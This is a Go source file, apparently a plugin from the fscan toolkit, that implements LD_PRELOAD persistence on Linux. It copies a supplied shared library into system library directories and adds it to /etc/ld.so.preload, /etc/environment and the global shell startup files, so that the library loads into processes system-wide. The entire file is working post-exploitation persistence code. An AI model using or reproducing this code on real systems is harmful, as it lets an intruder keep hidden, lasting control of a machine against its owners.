//go:build (plugin_ldpreload || !plugin_selective) && linux && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// LDPreloadPlugin LD_PRELOAD持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现持久化功能
// - 保持原有功能逻辑
type LDPreloadPlugin struct {
	plugins.BasePlugin
}

// NewLDPreloadPlugin 创建LD_PRELOAD持久化插件
func NewLDPreloadPlugin() *LDPreloadPlugin {
	return &LDPreloadPlugin{
		BasePlugin: plugins.NewBasePlugin("ldpreload"),
	}
}

// Scan 执行LD_PRELOAD持久化 - 直接实现
func (p *LDPreloadPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	var output strings.Builder

	if runtime.GOOS != "linux" {
		output.WriteString("LD_PRELOAD持久化只支持Linux平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	// 从config获取配置
	targetFile := config.PersistenceTargetFile
	if targetFile == "" {
		output.WriteString("必须通过 -persistence-file 参数指定目标文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定目标文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(targetFile); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("目标文件不存在: %s\n", targetFile))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidFile(targetFile) {
		output.WriteString(fmt.Sprintf("目标文件必须是 .so 动态库文件: %s\n", targetFile))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效文件类型"),
		}
	}

	output.WriteString("=== LD_PRELOAD持久化 ===\n")
	output.WriteString(fmt.Sprintf("目标文件: %s\n", targetFile))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	var successCount int

	// 1. 复制文件到系统目录
	systemPath, err := p.copyToSystemPath(targetFile)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 复制文件到系统目录失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 文件已复制到: %s\n", systemPath))
		successCount++
	}

	// 2. 添加到全局环境变量
	err = p.addToEnvironment(systemPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加环境变量失败: %v\n", err))
	} else {
		output.WriteString("✓ 已添加到全局环境变量\n")
		successCount++
	}

	// 3. 添加到shell配置文件
	shellConfigs, err := p.addToShellConfigs(systemPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加到shell配置失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 已添加到shell配置: %s\n", strings.Join(shellConfigs, ", ")))
		successCount++
	}

	// 4. 创建库配置文件
	err = p.createLdConfig(systemPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 创建ld配置失败: %v\n", err))
	} else {
		output.WriteString("✓ 已创建ld预加载配置\n")
		successCount++
	}

	// 输出统计
	output.WriteString(fmt.Sprintf("\nLD_PRELOAD持久化完成: 成功(%d) 总计(%d)\n", successCount, 4))

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("ldpreload_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Output:  output.String(),
		Error:   nil,
	}
}

// copyToSystemPath 复制文件到系统目录
func (p *LDPreloadPlugin) copyToSystemPath(targetFile string) (string, error) {
	// 选择合适的系统目录
	systemDirs := []string{
		"/usr/lib/x86_64-linux-gnu",
		"/usr/lib64",
		"/usr/lib",
		"/lib/x86_64-linux-gnu",
		"/lib64",
		"/lib",
	}

	var targetDir string
	for _, dir := range systemDirs {
		if _, err := os.Stat(dir); err == nil {
			targetDir = dir
			break
		}
	}

	if targetDir == "" {
		return "", fmt.Errorf("找不到合适的系统库目录")
	}

	// 生成目标路径
	basename := filepath.Base(targetFile)
	if !strings.HasPrefix(basename, "lib") {
		basename = "lib" + basename
	}
	if !strings.HasSuffix(basename, ".so") {
		basename = strings.TrimSuffix(basename, filepath.Ext(basename)) + ".so"
	}

	targetPath := filepath.Join(targetDir, basename)

	// 复制文件
	err := p.copyFile(targetFile, targetPath)
	if err != nil {
		return "", err
	}

	// 设置权限
	_ = os.Chmod(targetPath, 0755)

	return targetPath, nil
}

// copyFile 复制文件
func (p *LDPreloadPlugin) copyFile(src, dst string) error {
	cmd := exec.Command("cp", src, dst)
	return cmd.Run()
}

// addToEnvironment 添加到全局环境变量
func (p *LDPreloadPlugin) addToEnvironment(libPath string) error {
	envFile := "/etc/environment"

	// 读取现有内容
	content := ""
	if data, err := os.ReadFile(envFile); err == nil {
		content = string(data)
	}

	// 检查是否已存在
	ldPreloadLine := fmt.Sprintf("LD_PRELOAD=\"%s\"", libPath)
	if strings.Contains(content, libPath) {
		return nil // 已存在
	}

	// 添加新行
	if !strings.HasSuffix(content, "\n") && content != "" {
		content += "\n"
	}
	content += ldPreloadLine + "\n"

	// 写入文件
	return os.WriteFile(envFile, []byte(content), 0644)
}

// addToShellConfigs 添加到shell配置文件
func (p *LDPreloadPlugin) addToShellConfigs(libPath string) ([]string, error) {
	configFiles := []string{
		"/etc/bash.bashrc",
		"/etc/profile",
		"/etc/zsh/zshrc",
	}

	ldPreloadLine := fmt.Sprintf("export LD_PRELOAD=\"%s:$LD_PRELOAD\"", libPath)
	var modified []string

	for _, configFile := range configFiles {
		if _, err := os.Stat(configFile); os.IsNotExist(err) {
			continue
		}

		// 读取现有内容
		content := ""
		if data, err := os.ReadFile(configFile); err == nil {
			content = string(data)
		}

		// 检查是否已存在
		if strings.Contains(content, libPath) {
			continue
		}

		// 添加新行
		if !strings.HasSuffix(content, "\n") && content != "" {
			content += "\n"
		}
		content += ldPreloadLine + "\n"

		// 写入文件
		if err := os.WriteFile(configFile, []byte(content), 0644); err == nil {
			modified = append(modified, configFile)
		}
	}

	if len(modified) == 0 {
		return nil, fmt.Errorf("无法修改任何shell配置文件")
	}

	return modified, nil
}

// createLdConfig 创建ld预加载配置
func (p *LDPreloadPlugin) createLdConfig(libPath string) error {
	configFile := "/etc/ld.so.preload"

	// 读取现有内容
	content := ""
	if data, err := os.ReadFile(configFile); err == nil {
		content = string(data)
	}

	// 检查是否已存在
	if strings.Contains(content, libPath) {
		return nil
	}

	// 添加新行
	if !strings.HasSuffix(content, "\n") && content != "" {
		content += "\n"
	}
	content += libPath + "\n"

	// 写入文件
	return os.WriteFile(configFile, []byte(content), 0644)
}

// isValidFile 检查文件类型
func (p *LDPreloadPlugin) isValidFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))

	// 检查扩展名
	if ext == ".so" || ext == ".elf" {
		return true
	}

	// 检查文件内容（ELF魔数）
	file, err := os.Open(filePath)
	if err != nil {
		return false
	}
	defer func() { _ = file.Close() }()

	header := make([]byte, 4)
	if n, err := file.Read(header); err != nil || n < 4 {
		return false
	}

	// ELF魔数: 0x7f 0x45 0x4c 0x46
	return header[0] == 0x7f && header[1] == 0x45 && header[2] == 0x4c && header[3] == 0x46
}

// 注册插件
func init() {
	RegisterLocalPlugin("ldpreload", func() Plugin {
		return NewLDPreloadPlugin()
	})
}
